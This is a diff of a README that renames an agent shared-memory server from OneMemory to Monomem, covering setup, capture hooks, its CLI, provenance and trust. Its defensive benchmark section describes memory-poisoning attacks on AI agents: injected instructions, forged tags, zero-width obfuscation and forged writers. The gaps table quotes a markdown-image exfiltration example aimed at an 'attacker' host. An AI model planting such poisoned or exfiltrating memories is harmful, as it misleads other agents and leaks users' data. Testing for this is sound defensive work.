@@ -1,5 +1,5 @@
 <!-- Image URLs are absolute on purpose: GitHub resolves relative paths, npm does not. -->
-![OneMemory — one memory, every assistant](https://raw.githubusercontent.com/calasdan-sketch/onememory/main/docs/brand/onememory-banner.png)
+![Monomem — one memory, every assistant](https://raw.githubusercontent.com/calasdan-sketch/monomem/main/docs/brand/monomem-banner.png)
 
 **Auditable shared memory for AI coding agents.** Tell Claude, Cursor, Codex or
 Gemini something once and the rest already know it — one self-hosted SQLite
@@ -7,16 +7,16 @@ file, over MCP or plain REST. No API keys, no cloud, no hidden model calls.
 **Every note records who wrote it, is versioned, and is one undo away**, with
 [benchmarks](#benchmark) to prove it.
 
-[![CI](https://github.com/calasdan-sketch/onememory/actions/workflows/ci.yml/badge.svg)](https://github.com/calasdan-sketch/onememory/actions/workflows/ci.yml)
-[![npm](https://img.shields.io/npm/v/onememory-mcp)](https://www.npmjs.com/package/onememory-mcp)
+[![CI](https://github.com/calasdan-sketch/monomem/actions/workflows/ci.yml/badge.svg)](https://github.com/calasdan-sketch/monomem/actions/workflows/ci.yml)
+[![npm](https://img.shields.io/npm/v/monomem)](https://www.npmjs.com/package/monomem)
 ![License](https://img.shields.io/badge/license-MIT-blue)
 ![Node](https://img.shields.io/badge/node-%3E%3D22.16-green)
 
-![One writer stores a note; a second, separately authenticated writer reads it back and can show who wrote it](https://raw.githubusercontent.com/calasdan-sketch/onememory/main/docs/onememory-demo.gif)
+![One writer stores a note; a second, separately authenticated writer reads it back and can show who wrote it](https://raw.githubusercontent.com/calasdan-sketch/monomem/main/docs/monomem-demo.gif)
 
 *Reconstructed from a real two-writer run against one store. The note, the
 server-stamped `written_by`, and the 255 ms read are reproduced exactly from
-[`docs/brand/demo-transcript.txt`](https://github.com/calasdan-sketch/onememory/blob/main/docs/brand/demo-transcript.txt).
+[`docs/brand/demo-transcript.txt`](https://github.com/calasdan-sketch/monomem/blob/main/docs/brand/demo-transcript.txt).
 The two sides are two separately authenticated write tokens, not two recorded
 vendor clients; the provenance is real, the client names illustrate the use
 case. Frames are rendered rather than screen-captured so the text is legible
@@ -36,56 +36,56 @@ web access).
 
 ## Quickstart
 
-> **Requires Node.js 22.16 or newer** (22.16+ or 24 LTS). OneMemory uses Node's
+> **Requires Node.js 22.16 or newer** (22.16+ or 24 LTS). Monomem uses Node's
 > built-in `node:sqlite`, which arrived in 22.5 but needed a flag until 22.16. Check with `node -v`. Can't
 > upgrade? Use [Docker](#docker) instead.
 
 ### Install in 60 seconds
 
 ```bash
-npx onememory-mcp setup
+npx monomem setup
 ```
 
 `setup` finds Claude Code, Claude Desktop, Cursor, Codex, Gemini CLI, Muse, VS Code and Zed on this computer, shows you in plain words what it will do and the exact
 lines it will change, saves a backup of each file, and writes only after you type `y`. Then it writes a first test note, reads it
-back, runs `onememory doctor` and tells you how to check it inside Claude Code (type `/mcp`). To look first: `npx onememory-mcp setup
---dry-run`. To go back: `onememory setup --undo`. It changes only the OneMemory entry; your other servers and settings stay as they
+back, runs `monomem doctor` and tells you how to check it inside Claude Code (type `/mcp`). To look first: `npx monomem setup
+--dry-run`. To go back: `monomem setup --undo`. It changes only the Monomem entry; your other servers and settings stay as they
 are. **Coming from claude-bridge** (the old name)? It offers to move that entry across and keeps your data. Step by step, with
 troubleshooting: [docs/live-claude-code.md](./docs/live-claude-code.md).
 
-Already have notes in Claude Code? `onememory import --claude --dry-run` shows what could be brought in from your `CLAUDE.md` files and
+Already have notes in Claude Code? `monomem import --claude --dry-run` shows what could be brought in from your `CLAUDE.md` files and
 Claude Code's auto memory (secrets are skipped, nothing leaves your computer). Coming from claude-mem, mem0 or basic-memory?
-`onememory import --from claude-mem --dry-run` (or `mem0 --path export.json`, `basic-memory`); see [docs/switching.md](./docs/switching.md)
+`monomem import --from claude-mem --dry-run` (or `mem0 --path export.json`, `basic-memory`); see [docs/switching.md](./docs/switching.md)
 for the import and a clean uninstall of the old tool.
 
 The manual way, if you prefer:
 
 ```bash
-npm i -g onememory-mcp                           # 1. install
-claude mcp add onememory -- onememory mcp        # 2. wire it into Claude Code (stdio)
-onememory doctor                                 # 3. verify Node, database, token
+npm i -g monomem                           # 1. install
+claude mcp add monomem -- monomem mcp        # 2. wire it into Claude Code (stdio)
+monomem doctor                                 # 3. verify Node, database, token
 ```
 
 Then, in Claude, say **"remember that my staging server is on port 8443"**,
 and in a fresh chat ask "what port is my staging server on?". Step 4, only
 if you want the dashboard, REST API and MCP-over-HTTP (the `curl` examples
-below need it): `onememory start`.
+below need it): `monomem start`.
 
-No global install: `claude mcp add onememory -- npx -y onememory-mcp mcp`.
-`onememory init` prints the config for Claude Desktop / Cursor / Copilot;
+No global install: `claude mcp add monomem -- npx -y monomem mcp`.
+`monomem init` prints the config for Claude Desktop / Cursor / Copilot;
 [INSTALL.md](./INSTALL.md) has every client.
 
-`onememory start` serves the dashboard and REST API on `:8790` and
+`monomem start` serves the dashboard and REST API on `:8790` and
 MCP-over-HTTP on `:8791` (bound to `127.0.0.1`). To reach it from your phone
 or claude.ai, put an authenticated tunnel (Cloudflare Tunnel + Access,
 Tailscale, or your own TLS proxy) in front of `:8791` — see
 [INFRA.md](./INFRA.md).
 
-Plain REST works too once `onememory start` is running (the token is in
-`~/.onememory/.token`):
+Plain REST works too once `monomem start` is running (the token is in
+`~/.monomem/.token`):
 
 ```bash
-TOKEN=$(cat ~/.onememory/.token)
+TOKEN=$(cat ~/.monomem/.token)
 curl -X POST localhost:8790/notes -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"title":"Deploy day","body":"Shipped v1.1"}'
 curl -H "Authorization: Bearer $TOKEN" "localhost:8790/search?q=deploy"
 ```
@@ -93,40 +93,40 @@ curl -H "Authorization: Bearer $TOKEN" "localhost:8790/search?q=deploy"
 ### Where your data lives
 
 Everything (database, token, scoped tokens, spaces config) lives in
-`~/.onememory` (Windows: `%USERPROFILE%\.onememory`), outside the installed
+`~/.monomem` (Windows: `%USERPROFILE%\.monomem`), outside the installed
 package, so `npm update` and npx cache cleanups never touch it. Set
-`ONEMEMORY_HOME` to put it elsewhere, or `ONEMEMORY_DB_PATH` for just the
+`MONOMEM_HOME` to put it elsewhere, or `MONOMEM_DB_PATH` for just the
 database. On macOS/Linux the folder is owner-only (`0700`, files `0600`).
 A from-source git checkout that already has `./data/state.db` keeps using
-it. `onememory doctor` shows which directory is in use.
+it. `monomem doctor` shows which directory is in use.
 
-**Upgrading from an early 1.0.x install** (data kept inside the package folder): copy it yourself before removing the old package, e.g. `mkdir -p ~/.onememory && cp -Rn "$(npm root -g)/onememory-mcp/data/." ~/.onememory/` (Windows: `%APPDATA%\npm\node_modules\onememory-mcp\data\*` to `%USERPROFILE%\.onememory\`), then run `onememory rebuild-edges` once.
+**Upgrading from an early 1.0.x install** (data kept inside the package folder): copy it yourself before removing the old package, e.g. `mkdir -p ~/.monomem && cp -Rn "$(npm root -g)/monomem/data/." ~/.monomem/` (Windows: `%APPDATA%\npm\node_modules\monomem\data\*` to `%USERPROFILE%\.monomem\`), then run `monomem rebuild-edges` once.
 
 ### Docker
 
 ```bash
-cp .env.example .env     # set ONEMEMORY_TOKEN (openssl rand -hex 32)
+cp .env.example .env     # set MONOMEM_TOKEN (openssl rand -hex 32)
 docker compose up -d     # dashboard at http://localhost:8790
 ```
 
 ### Backups & restore
 
 ```bash
-onememory backup --out ~/om-backup     # consistent hot copy; safe while the server runs
+monomem backup --out ~/om-backup     # consistent hot copy; safe while the server runs
 ```
 
 (The attestation signing key `.attest-key` is not copied; see [docs/trust.md](./docs/trust.md#setting-it-up-between-two-servers).)
 
 
-`onememory backup` writes `state.db` (via SQLite `VACUUM INTO`) plus, if
+`monomem backup` writes `state.db` (via SQLite `VACUUM INTO`) plus, if
 at-rest encryption is on, a copy of the `.key` file. **Keep the key apart from
 the backup**: a backup without its key is unreadable, and one stored next to it
 is not encrypted. See [INFRA.md](./INFRA.md#7-backups). The JSON route (admin
 token) also works:
 
 ```bash
-TOKEN=$(cat ~/.onememory/.token)
-curl -H "Authorization: Bearer $TOKEN" localhost:8790/export > backup.json   # or: onememory export --format json --out backup.json
+TOKEN=$(cat ~/.monomem/.token)
+curl -H "Authorization: Bearer $TOKEN" localhost:8790/export > backup.json   # or: monomem export --format json --out backup.json
 curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
   --data-binary @backup.json localhost:8790/import                           # admin scope only
 ```
@@ -142,7 +142,7 @@ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/jso
   [SECURITY.md](./SECURITY.md)). The change feed's per-edit log is separate:
   metadata only (titles, no bodies), pruned after 90 days, and never part of
   a JSON backup.
-- **Exports stream.** `GET /export` and `onememory export --format json` page
+- **Exports stream.** `GET /export` and `monomem export --format json` page
   through the store and write as they go, so peak memory is one page (500
   notes) regardless of store size — a multi-month store dumps in one pass.
 - **Restores keep the history that exists.** `created_at`, `updated_at`,
@@ -150,87 +150,87 @@ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/jso
   stays at rev 26, so `if_rev` guards and the change feed stay accurate).
   Imports over 200 notes land in seconds and defer the O(n²) similarity-graph
   rebuild — the response says so and search works immediately; run
-  `onememory rebuild-edges` when you want neighbor ranking back. Restored
+  `monomem rebuild-edges` when you want neighbor ranking back. Restored
   notes are re-embedded automatically when semantic search is enabled.
 - Markdown (one file per note, git-friendly) is a separate path:
-  `onememory export --format md --dir ~/memory` — see
+  `monomem export --format md --dir ~/memory` — see
   [docs/file-sync.md](./docs/file-sync.md).
 
 ---
 
 ## Automatic memory
 
-OneMemory can also remember what Claude Code *does*, without anyone writing a note:
+Monomem can also remember what Claude Code *does*, without anyone writing a note:
 
 ```bash
-onememory setup --capture        # or answer y to "Also record what Claude does in this project ...?"
+monomem setup --capture        # or answer y to "Also record what Claude does in this project ...?"
 ```
 
 - **What is recorded:** prompts, tool calls, file edits, commands and their errors, through Claude Code's hooks
-  (`onememory hook <event>`). Only on this machine, in the same SQLite file; raw events are deleted after 7 days
-  (`ONEMEMORY_CAPTURE_RETENTION_DAYS`).
+  (`monomem hook <event>`). Only on this machine, in the same SQLite file; raw events are deleted after 7 days
+  (`MONOMEM_CAPTURE_RETENTION_DAYS`).
 - **What is kept:** a free, deterministic distiller (no model call) turns each session into a few **observations**
   (a commit typed by its `fix:` / `feat:` / `refactor:` prefix, a test that failed and then passed, a decision you
   stated, a secret that was kept out) and one **session summary** (request, files, commands, outcome, next step).
   They are ordinary notes with a `kind`, so lint, quarantine, history, search and the trust policy apply to them,
   and they never show up in `state_list` / `state_search` unless asked for.
 - **Private by default:** `<private>...</private>` blocks are dropped and secrets are replaced with
-  `[REDACTED:<type>]` *before* anything is stored. `ONEMEMORY_CAPTURE=off` stops it; `ONEMEMORY_CAPTURE_EXCLUDE`
-  skips folders; `ONEMEMORY_CAPTURE_SKIP_TOOLS` skips tools.
+  `[REDACTED:<type>]` *before* anything is stored. `MONOMEM_CAPTURE=off` stops it; `MONOMEM_CAPTURE_EXCLUDE`
+  skips folders; `MONOMEM_CAPTURE_SKIP_TOOLS` skips tools.
 - **Never in the way:** every hook exits 0 and never migrates the database. If the database is busy or from another
   version, the (already redacted) event waits in a spool file and is stored by a later hook.
 - **Back at the next session:** the start-of-session context is ranked by what you are working on (git branch, changed
-  files, recent work), packed into `ONEMEMORY_RECALL_TOKENS` (1500), and ends with what it stands in for.
+  files, recent work), packed into `MONOMEM_RECALL_TOKENS` (1500), and ends with what it stands in for.
 - **Looking things up:** `memory_index` (compact rows) → `memory_timeline` (what happened around one) →
   `memory_get` (full text, cite as `om:#id`), plus `session_list`. REST: `GET /index`, `GET /timeline`, `POST /get`,
-  `GET /sessions`, `GET /files/timeline?path=`. The [onememory-mem skill](./skills/onememory-mem/SKILL.md) teaches
+  `GET /sessions`, `GET /files/timeline?path=`. The [monomem-mem skill](./skills/monomem-mem/SKILL.md) teaches
   an agent this order.
-- **Before a file is read:** a `PreToolUse` hook on `Read` (`onememory hook file-context`, installed with
+- **Before a file is read:** a `PreToolUse` hook on `Read` (`monomem hook file-context`, installed with
   `--capture`) tells the agent which memories are linked to that file, once per session per file. It is advisory
   only: it never blocks, allows or changes the Read. Same namespace, trust and UNTRUSTED-banner rules as the
   start-of-session context.
 - **In the dashboard:** the **Sessions** tab lists recorded sessions; open one for its timeline (summary, prompts,
   observations, oldest first).
-- **Optional local model:** set `ONEMEMORY_LLM_URL` (an OpenAI-compatible server such as Ollama,
-  `http://127.0.0.1:11434`) and `ONEMEMORY_LLM_MODEL`, and at session end one call rewrites the session summary in
-  plain words. Off by default; only a loopback URL is accepted (`ONEMEMORY_LLM_ALLOW_REMOTE=1` to override); bounded
-  by `ONEMEMORY_LLM_TIMEOUT_MS`; the answer is redacted and linted like any write, and on any failure the automatic
+- **Optional local model:** set `MONOMEM_LLM_URL` (an OpenAI-compatible server such as Ollama,
+  `http://127.0.0.1:11434`) and `MONOMEM_LLM_MODEL`, and at session end one call rewrites the session summary in
+  plain words. Off by default; only a loopback URL is accepted (`MONOMEM_LLM_ALLOW_REMOTE=1` to override); bounded
+  by `MONOMEM_LLM_TIMEOUT_MS`; the answer is redacted and linted like any write, and on any failure the automatic
   summary stays.
 - **Moves with your data:** export / import and the Markdown vault sync carry an observation's kind, session, type
-  and files; `onememory encrypt enable` seals captured event outputs too. Captured rows are left out of the stale
+  and files; `monomem encrypt enable` seals captured event outputs too. Captured rows are left out of the stale
   count, `memory_stats` totals and consolidation.
-- **Old captured rows fade out:** an observation nobody updated or read for 30 days (`ONEMEMORY_DECAY_DAYS`; summaries
-  180, `ONEMEMORY_DECAY_SUMMARY_DAYS`) is archived, never deleted, by the expiry sweep or at session end. Your own notes,
-  decisions and anything tagged `pinned` never decay. `onememory decay --dry-run` shows what would go; `onememory
+- **Old captured rows fade out:** an observation nobody updated or read for 30 days (`MONOMEM_DECAY_DAYS`; summaries
+  180, `MONOMEM_DECAY_SUMMARY_DAYS`) is archived, never deleted, by the expiry sweep or at session end. Your own notes,
+  decisions and anything tagged `pinned` never decay. `monomem decay --dry-run` shows what would go; `monomem
   restore <id>` brings one back; `memory_stats` reports the counts.
-- **Memory quality:** `onememory quality [--json]` (and the dashboard's **Quality** tab, admin token, `GET /quality`)
+- **Memory quality:** `monomem quality [--json]` (and the dashboard's **Quality** tab, admin token, `GET /quality`)
   lists near-duplicates, stale notes with a newer twin, quarantined writes, notes the linter flags and rows about to
   decay, each with the command or button that fixes it. Every fix previews or asks first and can be undone.
 
-**Semantic search when available:** `ONEMEMORY_EMBEDDINGS=auto` uses your local embedding endpoint when it answers
+**Semantic search when available:** `MONOMEM_EMBEDDINGS=auto` uses your local embedding endpoint when it answers
 and quietly stays on keyword search when it does not (it retries once a minute).
 
-`onememory doctor` shows whether the hooks are wired, the last captured event and the spool size;
-`onememory setup --undo` takes the hooks out again.
+`monomem doctor` shows whether the hooks are wired, the last captured event and the spool size;
+`monomem setup --undo` takes the hooks out again.
 
 **At session start** you get a short "What I know about this project" block first (decisions, conventions, key
 files, the last session, open-task count), built from your stored notes with no model, capped at
-`ONEMEMORY_PROFILE_TOKENS` (300) and switched off with `ONEMEMORY_PROFILE=off`. Every memory line then says why it is
+`MONOMEM_PROFILE_TOKENS` (300) and switched off with `MONOMEM_PROFILE=off`. Every memory line then says why it is
 there, in a few characters (`{files,kw 3d}`: linked to files you changed, matches your branch, three days old). A
-memory that keeps showing up without helping: `onememory never-show <id>`, the dashboard's **never show** button, or
+memory that keeps showing up without helping: `monomem never-show <id>`, the dashboard's **never show** button, or
 the tag `never-show`. It stays searchable; it is just never injected again.
 
 ### What it costs you
 
-OneMemory makes **no hidden model calls**. The only model it ever talks to is the optional local summarizer
-(`ONEMEMORY_LLM_URL`, off by default, one call per session). The meter shows the rest, as aggregate numbers only (no
+Monomem makes **no hidden model calls**. The only model it ever talks to is the optional local summarizer
+(`MONOMEM_LLM_URL`, off by default, one call per session). The meter shows the rest, as aggregate numbers only (no
 prompt or note text is recorded):
 
 - tokens injected at session start, per session and in total, and the tokens of captured work they stood in for;
 - tokens the local summarizer used (0 while it is off);
 - capture events recorded and the database size on disk.
 
-See it in `onememory doctor` (the `footprint:` line), `GET /stats` and `memory_stats` (the `meter` field), and the
+See it in `monomem doctor` (the `footprint:` line), `GET /stats` and `memory_stats` (the `meter` field), and the
 dashboard's **Meter** view. Tokens are estimates at about 4 characters a token.
 
 ---
@@ -255,7 +255,7 @@ dashboard's **Meter** view. Tokens are estimates at about 4 characters a token.
 - **Task board, handoffs, catch-up.** `task_put` / `task_get` / `task_list` /
   `task_claim`, `session_handoff`, and one `catch_up` call (changes since you last looked +
   open tasks + latest handoff). Built on plain notes, so it is encrypted,
-  namespaced and searchable like the rest; `onememory recall` includes open
+  namespaced and searchable like the rest; `monomem recall` includes open
   tasks and the latest handoff at session start. → [docs/tasks.md](./docs/tasks.md)
 - **Memory linter.** Every write is scanned for secrets (API keys, JWTs,
   private keys, high-entropy tokens) and prompt-injection instructions
@@ -264,9 +264,9 @@ dashboard's **Meter** view. Tokens are estimates at about 4 characters a token.
   and invisible to search and recall until approved. It is a pattern
   linter, with unit tests but no published false-positive rate: expect misses
   and the occasional false flag. → [docs/memory-linter.md](./docs/memory-linter.md)
-- **Plain-file sync.** `onememory export --format md --dir` writes one
+- **Plain-file sync.** `monomem export --format md --dir` writes one
   Markdown file per note with YAML front-matter, deterministic and
-  git-friendly; `onememory import --dir` merges edits back three-way — newer
+  git-friendly; `monomem import --dir` merges edits back three-way — newer
   wins, conflicts reported and the losing version kept, never silently lost.
   Works across machines through GitHub or Syncthing. → [docs/file-sync.md](./docs/file-sync.md)
 - **Scoped tokens.** `read` / `write` / `admin` bearer tokens, enforced
@@ -293,7 +293,7 @@ flowchart LR
         PH["Phone / Web"]
         CU["Cursor / Copilot"]
     end
-    subgraph OM["OneMemory (one Node process)"]
+    subgraph OM["Monomem (one Node process)"]
         MCP["MCP server\n(stdio + HTTP)"]
         REST["REST API + Dashboard"]
         LINT["Memory linter\n(secrets + injection scan)"]
@@ -322,7 +322,7 @@ publish one. Read their own docs and pick on your needs:
   [official MCP memory server](https://github.com/modelcontextprotocol/servers/tree/main/src/memory)
   are all worth a look.
 
-What OneMemory itself provides (all of it checkable in this repo): MIT
+What Monomem itself provides (all of it checkable in this repo): MIT
 license, Node 22.16+ with 2 direct runtime dependencies, one SQLite file,
 MCP over stdio and HTTP plus a REST API, optional semantic search with your
 own embeddings endpoint, a change feed that includes deletes, a write-time
@@ -339,7 +339,7 @@ encryption of note bodies. See [SECURITY.md](./SECURITY.md) for what it does
 `state_list`, `state_delete`, `catch_up`, `memory_supersede_preview`, `memory_supersede_confirm`,
 `memory_supersede_undo`. Every tool's
 schema is sent to the model on every turn, so the rest are operator tooling you opt into with
-`ONEMEMORY_TOOLS=all`, or by naming them: `ONEMEMORY_TOOLS=memory_index,memory_timeline`. See
+`MONOMEM_TOOLS=all`, or by naming them: `MONOMEM_TOOLS=memory_index,memory_timeline`. See
 [docs/configuration.md](./docs/configuration.md). The command runner (`task_*`, `runner_status`) is **not
 shipped in the npm package** — build it from the repo.
 
@@ -350,8 +350,8 @@ shipped in the npm package** — build it from the repo.
 | `memory_since` | read | change feed (`wait_seconds` = live wait) |
 | `task_put` / `task_list` / `task_get` | write / read / read | shared task board across devices and models; `client_key` makes a create retry-safe |
 | `task_claim` | write | take / heartbeat / release a task with a lease (compare-and-swap) |
-| `task_approve` | admin | approve a command task so the PC's runner may run it ([RUNNER.md](https://github.com/calasdan-sketch/onememory/blob/main/docs/RUNNER.md)) |
-| `runner_status` | read | is the PC's runner listening, and how many approved commands are waiting for it (`onememory runner-status`, `GET /runner/status`; [RUNNER.md](https://github.com/calasdan-sketch/onememory/blob/main/docs/RUNNER.md)) |
+| `task_approve` | admin | approve a command task so the PC's runner may run it ([RUNNER.md](https://github.com/calasdan-sketch/monomem/blob/main/docs/RUNNER.md)) |
+| `runner_status` | read | is the PC's runner listening, and how many approved commands are waiting for it (`monomem runner-status`, `GET /runner/status`; [RUNNER.md](https://github.com/calasdan-sketch/monomem/blob/main/docs/RUNNER.md)) |
 | `session_handoff` / `catch_up` | write / read | leave a handoff; one-call catch-up at session start |
 | `memory_ack` | read | confirm a manual-ack change-feed page |
 | `memory_stats` | read | totals, most-read, never-read, stale |
@@ -367,28 +367,28 @@ REST mirrors them (`/notes`, `/search`, `/relevant`, `/changes`, `/tasks`, `/han
 ## CLI
 
 ```
-onememory start | mcp | doctor | init
-onememory setup [--dry-run] [--yes] [--only claude-code,claude-desktop,cursor,codex,gemini,muse,vscode,zed] [--hook] [--undo]   # connect your apps; safe, backed up, undoable
-onememory import --claude [--dry-run] [--update] [--project <folder>]   # bring in CLAUDE.md files and Claude Code auto memory
-onememory import --from claude-mem|mem0|basic-memory [--path p] [--dry-run]   # switch from another memory tool (docs/switching.md)
-onememory sync --git ~/my-private-memory-repo [--encrypt]   # keep your computers in step through YOUR private git repository
-onememory changes --since last --consumer laptop
-onememory runner-status                           # is each PC's runner listening? commands waiting?
-onememory trust [list | distrust <w> | undistrust <w> | identity | attester-add <key> --server-id <id> | attester-remove <id> | attester-revoke <id>]
-onememory trust [export-key --out <file> | rotate]         # EXPERIMENTAL: signed attestations (docs/trust.md)
-onememory watch --consumer pc [--exec program args...]     # react to changes as they land
-onememory backup [--out dir] [--include-approval-key] [--include-attest-key]   # hot copy of the database (+ keys)
-onememory export --format md --dir ~/memory     onememory import --dir ~/memory
-onememory export --format json [--attest] --out a.json     onememory import --file a.json [--require-attestation]
-onememory supersede --old 12 --title "..." --body "..."   # replace a note: shows what you would lose, asks you to type the count
-onememory supersede undo <id>     onememory history <id> | restore <id> <version> | purge <id>
-onememory quarantine [list | approve <id> | reject <id>]
-onememory quality [--json]     onememory decay [--dry-run]     onememory archive <id> | restore <id>
-onememory consolidate | rebuild-edges | reindex | relevant "…" | recall
-onememory bench [--json] [--suite stale|contradiction|isolation|provenance] [--strict-gaps]   # provenance benchmark (docs/BENCHMARK.md)
+monomem start | mcp | doctor | init
+monomem setup [--dry-run] [--yes] [--only claude-code,claude-desktop,cursor,codex,gemini,muse,vscode,zed] [--hook] [--undo]   # connect your apps; safe, backed up, undoable
+monomem import --claude [--dry-run] [--update] [--project <folder>]   # bring in CLAUDE.md files and Claude Code auto memory
+monomem import --from claude-mem|mem0|basic-memory [--path p] [--dry-run]   # switch from another memory tool (docs/switching.md)
+monomem sync --git ~/my-private-memory-repo [--encrypt]   # keep your computers in step through YOUR private git repository
+monomem changes --since last --consumer laptop
+monomem runner-status                           # is each PC's runner listening? commands waiting?
+monomem trust [list | distrust <w> | undistrust <w> | identity | attester-add <key> --server-id <id> | attester-remove <id> | attester-revoke <id>]
+monomem trust [export-key --out <file> | rotate]         # EXPERIMENTAL: signed attestations (docs/trust.md)
+monomem watch --consumer pc [--exec program args...]     # react to changes as they land
+monomem backup [--out dir] [--include-approval-key] [--include-attest-key]   # hot copy of the database (+ keys)
+monomem export --format md --dir ~/memory     monomem import --dir ~/memory
+monomem export --format json [--attest] --out a.json     monomem import --file a.json [--require-attestation]
+monomem supersede --old 12 --title "..." --body "..."   # replace a note: shows what you would lose, asks you to type the count
+monomem supersede undo <id>     monomem history <id> | restore <id> <version> | purge <id>
+monomem quarantine [list | approve <id> | reject <id>]
+monomem quality [--json]     monomem decay [--dry-run]     monomem archive <id> | restore <id>
+monomem consolidate | rebuild-edges | reindex | relevant "…" | recall
+monomem bench [--json] [--suite stale|contradiction|isolation|provenance] [--strict-gaps]   # provenance benchmark (docs/BENCHMARK.md)
 ```
 
-`onememory help` explains each. Upgrading an existing 1.3.x install: [docs/upgrading.md](./docs/upgrading.md). The CLI runs with full local trust (no
+`monomem help` explains each. Upgrading an existing 1.3.x install: [docs/upgrading.md](./docs/upgrading.md). The CLI runs with full local trust (no
 token).
 
 ---
@@ -397,7 +397,7 @@ token).
 
 Every note carries a **server-stamped** `written_by` (who last changed its title or body; a tag edit or a task status change does not count) and `created_by`
 (the first). It is the label of the authenticated token that made the call, or a fixed
-marker for writers with no token: `stdio` (local MCP), `cli` (an `onememory` command),
+marker for writers with no token: `stdio` (local MCP), `cli` (an `monomem` command),
 `server` (its own jobs), `runner` (the command runner). A client cannot set it: `written_by` in a request body is
 ignored, and an import stamps the *importing* admin. The old `source` field is still
 there, but it is only what the writer *claims*, so anyone can put anything in it.
@@ -410,7 +410,7 @@ ignore its own writes or distrust a client. Rows from before 1.3.3 read `""` (un
 Details and limits: [docs/provenance.md](./docs/provenance.md).
 
 **Trust (1.4.0, hardened in 1.4.1).** `writer_id` (`<server_id>/<label>`) says which server a label came from. An admin can put a
-writer on a per-namespace **distrust list** (`onememory trust distrust <writer> --namespace work`, the
+writer on a per-namespace **distrust list** (`monomem trust distrust <writer> --namespace work`, the
 `trust_policy` MCP tool, `/trust` REST): its notes, tasks, handoffs and feed entries are then left out of every
 read path unless an **admin** passes `include_distrusted`, they stay hidden after anyone else edits them, and a
 distrusted command task is never run. A JSON export made with `--attest` (`?attest=1`; the default export is the
@@ -420,10 +420,10 @@ does not: [docs/trust.md](./docs/trust.md).
 
 ## Benchmark
 
-`onememory bench` checks the provenance behaviour a shared agent memory needs: that one agent cannot silently turn a weak
+`monomem bench` checks the provenance behaviour a shared agent memory needs: that one agent cannot silently turn a weak
 guess into shared truth. It is deterministic, offline, uses no model, and runs on a throwaway store through the real REST API
 (`npm run bench` from a checkout; `--json` for every scenario with expected vs actual; exit 1 on any failure, so it can gate CI).
-It has five suites, as plain JSON scenario files you can extend in [`bench/scenarios/`](https://github.com/calasdan-sketch/onememory/tree/main/bench/scenarios).
+It has five suites, as plain JSON scenario files you can extend in [`bench/scenarios/`](https://github.com/calasdan-sketch/monomem/tree/main/bench/scenarios).
 
 | Suite | Scenarios | What it checks | Headline number |
 |---|---|---|---|
@@ -433,7 +433,7 @@ It has five suites, as plain JSON scenario files you can extend in [`bench/scena
 | D  Provenance retention | 19 | source, writer, creator, timestamps, deletion deadline, confidence after export, import, merge, update | `fields-lost` |
 | E  Memory poisoning | 14 | injected or malicious memories never reach an agent as trusted content: prompt-injection (plain, forged tags, zero-width-obfuscated) is quarantined; a distrusted/low-trust writer cannot outrank or silently overwrite a trusted fact; secrets are redacted (capture) or blocked (write); a forged writer/namespace is stamped with the real one; an unsigned import cannot pose as verified; a captured web fetch is not trusted memory; SessionStart injection carries the untrusted-data banner and leaves distrusted notes out; mass near-duplicate flooding cannot bury the answer | `poison-reach-count` (must be 0) |
 
-**Retrieval quality (2.0.0).** `onememory bench --longmemeval` and `--locomo` score retrieval on the public datasets, with no model
+**Retrieval quality (2.0.0).** `monomem bench --longmemeval` and `--locomo` score retrieval on the public datasets, with no model
 and no judge (does the right conversation come back?). On one Windows PC, 2026-10-31:
 
 | Dataset | Search | Recall@5 | Recall@10 | Search time (p50) |
@@ -462,14 +462,14 @@ and never used to override the trust rules; 1.5.0 dropped it silently).
 Nothing is deleted, undo is one command, and every edit now keeps the text it replaces (admin-only history with restore). See
 [docs/replacing-memories.md](./docs/replacing-memories.md).
 
-**Known gaps.** Scenarios that fail because OneMemory lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
+**Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
 (`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0). **None is open.**
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
 | `GAP-SUPERSEDE` | No "this replaces that" link: write a second note and leave the first, and search returned both, the old one often first. | **Fixed in 1.6.0**: two-step replace; the old note is kept, hidden, labelled, undoable. | A05, A06, A10, A20, B03 (now pass) |
 | `GAP-RECENCY` | A 200-day-old note with better keyword overlap could outrank the current one (flagged, but not second). | **Fixed in 1.6.0**: a stale twin stays behind its newer twin. | A11 (now passes) |
-| `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from OneMemory. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
+| `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from Monomem. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
 | `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
@@ -477,12 +477,12 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 ## Security in one paragraph
 
 Loopback by default and fail-closed: it refuses to bind a public interface
-without an explicit `ONEMEMORY_TOKEN`. Constant-time bearer auth on every
+without an explicit `MONOMEM_TOKEN`. Constant-time bearer auth on every
 data route, scoped tokens, DNS-rebinding Origin checks, per-client rate
 limits, size caps, an append-only audit log without note content, the
 write-time linter above, and an untrusted-data banner on every MCP read (REST responses do not
 carry it) so agents treat note content as data, not instructions. Optional AES-256-GCM
-encryption at rest for note bodies only (`onememory encrypt enable`; titles,
+encryption at rest for note bodies only (`monomem encrypt enable`; titles,
 tags, timestamps and embeddings stay readable), per-note
 TTL with reversible soft-archive, and `?explain=1` so a caller can see why
